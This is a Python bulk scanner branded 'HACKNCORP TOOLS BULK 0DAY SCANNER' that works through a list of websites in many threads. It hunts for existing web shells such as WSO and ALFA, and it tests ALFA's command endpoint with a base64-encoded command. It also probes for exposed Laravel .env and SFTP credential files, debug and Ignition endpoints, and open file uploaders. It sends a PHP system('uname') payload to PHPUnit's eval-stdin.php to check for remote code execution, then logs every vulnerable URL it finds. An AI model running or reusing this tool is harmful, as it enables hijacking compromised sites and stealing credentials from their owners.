# -*- coding: utf-8 -*-

import requests, os, sys,re
from urllib.parse import urlparse
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from configparser import ConfigParser
from queue import Queue
from colorama import Fore                           
from colorama import Style
from colorama import init
import cfscrape
init(autoreset=True)
import os
os.system('cls' if os.name == 'nt' else 'clear')

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception as e: print(e)
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

def printf(text):
	''.join([str(item) for item in text])
	print((text + '\n'), end=' ')

def main(url):
	try:
		text = ' \033[32;1m#\033[0m '+url
		scraper = cfscrape.create_scraper()
		#SHELL FINDER
		shell_path = [
'wso1.php',
'wso.php',
'filemanager/dialog.php',
'js/filemanager/dialog.php',
'assets/filemanager/dialog.php',
'kcfinder/upload.php',
'assets/kcfinder/upload.php',
'assets/js/kcfinder/upload.php',
'ckfinder/ckfinder.html',
'plugins/ckfinder/ckfinder.html',
'assets/ckfinder/ckfinder.html',
'includes/ckfinder/ckfinder.html',
'assets/ALFA_DATA',
'filemanager',
'laravel-filemanager',
'assets/laravel-filemanager',
'js/laravel-filemanager/',
'plugins/laravel-filemanager',
'public/laravel-filemanager',
'cache/ALFA_DATA',
'wp-includes/ALFA_DATA',
'wp-content/uploads/ALFA_DATA',
'uploader.php',
'index1.php',
'tesla.php',
'mar.php',
'MARIJUANA.php',
'idx.php',
'upload.php',
'upl.php',
'admin.php',
'cron.phppython',
'wp-cron.php',
'byp.php',
'403.php',
'langar.php',
'wp-settings.php',
'tmp.php',
		]
		alfa_path = ['ALFA_DATA/alfacgiapi/perl.alfa','alfacgiapi/perl.alfa','wp-content/ALFA_DATA/alfacgiapi/perl.alfa','wp-content/alfacgiapi/perl.alfa','wp-admin/ALFA_DATA/alfacgiapi/perl.alfa','wp-admin/alfacgiapi/perl.alfa','wp-includes/ALFA_DATA/alfacgiapi/perl.alfa','wp-includes/alfacgiapi/perl.alfa','public/ALFA_DATA/alfacgiapi/perl.alfa',]
		admin_path = ['/admin/index.php', 'administrator/index.php', 'backend/index.php', 'adminpanel/index.php', 'webadmin/index.php', 'panel/index.php', 'cms/index.php', 'admindesa/index.php', 'adminkota/index.php', 'adminkec/index.php', 'rahasia/index.php', 'redaktur/index.php', 'master/index.php']
		for path in shell_path:
			get_shell = scraper.get(url+'/'+path,timeout=15, verify=False).text
			if '#1 SMP' in get_shell:
				text += ' => \033[32;1mSHELL\033[0m'
				open('results/shell.txt', 'a').write(url+'/'+path+'\n')
		for path in alfa_path:
			get_alfa = scraper.post(url+'/'+path,timeout=15, data="cmd=ZWNobyAnMHhKb2tlcic=", verify=False).text
			if '0xJoker' in get_alfa:
				text += ' => \033[32;1mALFA\033[0m'
				open('results/alfa.txt', 'a').write(url+'/'+path+'\n')
		for path in admin_path:
			get_admin = scraper.post(url+'/'+path,timeout=15, allow_redirects=True, verify=False).text
			if 'type="password"' in get_admin and not '404' in get_admin:
				text += ' => \033[32;1mADMIN\033[0m'
				open('results/admin.txt', 'a').write(url+'/'+path+'\n')
		
		#0DAY
		get_jfu = scraper.get(url+'/assets/comp/RichFilemanager/scripts/jQuery-File-Upload/server/php/',timeout=15, verify=False).text
		get_kcf = scraper.get(url,timeout=15, verify=False).text
		get_sftp = scraper.get(url+'/.vscode/sftp.json',timeout=15, verify=False).text
		get_evalstdin = scraper.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',data="<?php system('uname'); ?>" ,verify=False ,timeout=15).text
		get_env = scraper.get(url+'/.env',verify=False ,timeout=15).text
		get_ignition = scraper.get(url+'/_ignition/execute-solution',verify=False ,timeout=15).text
		get_env2 = scraper.get(url+'/laravel/.env',verify=False ,timeout=15).text
		get_sftp_conf = scraper.get(url+'/sftp-config.json',verify=False ,timeout=15).text
		# get_admin = scraper.get(url+'/admin/login.php',timeout=15, verify=False).text
		get_register = scraper.get(url+'/register',timeout=15, verify=False).text
		get_debugbar = scraper.get(url,timeout=15, verify=False).text
		get_laradebug = scraper.get(url,timeout=15, data="{'0x[]':'1337'}", verify=False).text
		
		if '{"files":[]}' in get_jfu:
			text += ' => \033[32;1mJFU\033[0m'
			open('results/vulnJFU.txt', 'a').write(url+'/assets/comp/RichFilemanager/scripts/jQuery-File-Upload/server/php/\n')
		if 'kcfinder/upload' in get_kcf:
			text += ' => \033[32;1mKCFINDER\033[0m'
			open('results/vuln_kcfinder.txt', 'a').write(url+'\n')
		if 'APP_ENV' in get_env:
			text += ' => \033[32;1mENV\033[0m'
			open('results/vuln_env.txt', 'a').write(url+'/.env\n')
		if 'APP_ENV' in get_ignition:
			text += ' => \033[32;1mENV\033[0m'
			open('results/vuln_ignition.txt', 'a').write(url+'/_ignition/execute-solution\n')
		if 'APP_ENV' in get_env2:
			text += ' => \033[32;1mENV\033[0m'
			open('results/vuln_env.txt', 'a').write(url+'/laravel/.env\n')
		if 'APP_ENV' in get_laradebug:
			text += ' => \033[32;1mENV\033[0m'
			open('results/laraveldebug.txt', 'a').write(url+'\n')
		if 'remotePath' in get_sftp:
			text += ' => \033[32;1mSFTP\033[0m'
			open('results/vuln_sftp.txt', 'a').write(url+'/.vscode/sftp.json\n')
		if 'new PhpDebugBar' in get_debugbar:
			text += ' => \033[32;1mDEBUGBAR\033[0m'
			open('results/debugbar.txt', 'a').write(url+'/\n')
		if 'remote_path' in get_sftp_conf:
			text += ' => \033[32;1mSFTP\033[0m'
			open('results/vuln_sftp.txt', 'a').write(url+'/sftp-config.json\n')
		if 'Linux' in get_evalstdin:
			print(get_evalstdin)
			text += ' => \033[32;1mPHPUNIT\033[0m'
			open('results/vuln_evalstdin.txt', 'a').write(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n')
		# if 'type="password"' or "type='password'" in get_admin:
		# 	text += ' => \033[32;1mV\033[0m'
		# 	open('adlog.txt', 'a').write(url+'/admin/login.php\n')
		if 'password_confirmation' in get_register:
			text += ' => \033[32;1mREGIST\033[0m'
			open('results/lara_regist.txt', 'a').write(url+'/register\n')
		else:
			text += ' => \033[31;1mNO\033[0m'
	except Exception as err:
		print(f"Unexpected {err=}, {type(err)=}")
	except:
		text = '\033[31;1m#\033[0m '+url
		text += ' => \033[31;1mE\033[0m'
	printf(text)
	

if __name__ == '__main__':
	print("""
       ________ 
      /    /   \ 
     /         / HACKNCORP TOOLS
    /         / BULK 0DAY SCANNER
    \___/____/ hackncorp@gmail.com
""")
	try:
		lists = sys.argv[1]
		numthread = sys.argv[2]
		readsplit = open(lists).read().splitlines()
	except:
		try:
			lists = input(" root@localhost:~$ file ")
			readsplit = open(lists).read().splitlines()
		except:
			print(" Wrong input or list not found!")
			exit()
		try:
			numthread = input(" root@localhost:~$ threads ")
		except:

			print(" Wrong thread number!")
			exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			exit()
	pool.wait_completion()
